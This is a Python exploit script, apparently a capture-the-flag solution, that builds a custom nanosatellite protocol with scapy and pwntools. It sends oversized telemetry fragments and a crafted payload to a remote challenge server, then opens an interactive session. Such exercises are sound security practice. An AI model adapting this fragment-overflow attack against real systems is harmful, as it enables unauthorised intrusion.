from scapy.all import *
from pwn import *

service = {
    1: "BUS",
    2: "PAYLOAD",
    3: "TELE",
    4: "CTRL",
    5: "DISC"
}

class NOSP(Packet):
    name = "Nanosatellite Space Protocol"
    fields_desc = [
        ByteEnumField("Service",0,service),
        ByteField("Length",0),
        ByteField("FragmentID",0),
        StrFixedLenField("Payload",default="",length=256)
    ]

io = remote("0.cloud.chals.io",34357)
#io = remote("127.0.0.1",5555)
def send_bus():
    pkt = NOSP(Service="BUS")
    io.send(raw(pkt))
def send_payload():
    pkt = NOSP(Service="PAYLOAD")
    io.send(raw(pkt))
def send_tele():
    for x in range(12):
        pkt = NOSP(Service="TELE")
        pkt.FragmentID=0
        pkt.Payload = chr(0x41+x)*256
        pkt.Length = len(pkt.Payload)-1
        io.send(raw(pkt))
    pkt = NOSP(Service="TELE")
    pkt.FragmentID=0
    pkt.Payload = p32(1)
    pkt.Length = len(pkt.Payload)-1
    io.send(raw(pkt))

def send_ctrl():
    pkt = NOSP(Service="CTRL")
    pkt.Payload = b"C"*8
    pkt.Length = len(pkt.Payload)
    io.send(raw(pkt))
def send_disconnect():
    pkt = NOSP(Service="DISC")
    io.send(raw(pkt))
def again():
    pkt = NOSP(Service=3)
    pkt.FragmentID=0xb
    pkt.Payload = b"Z"*256
    pkt.Length = len(pkt.Payload)-1
    io.send(raw(pkt))
send_tele()
send_ctrl()
io.interactive()
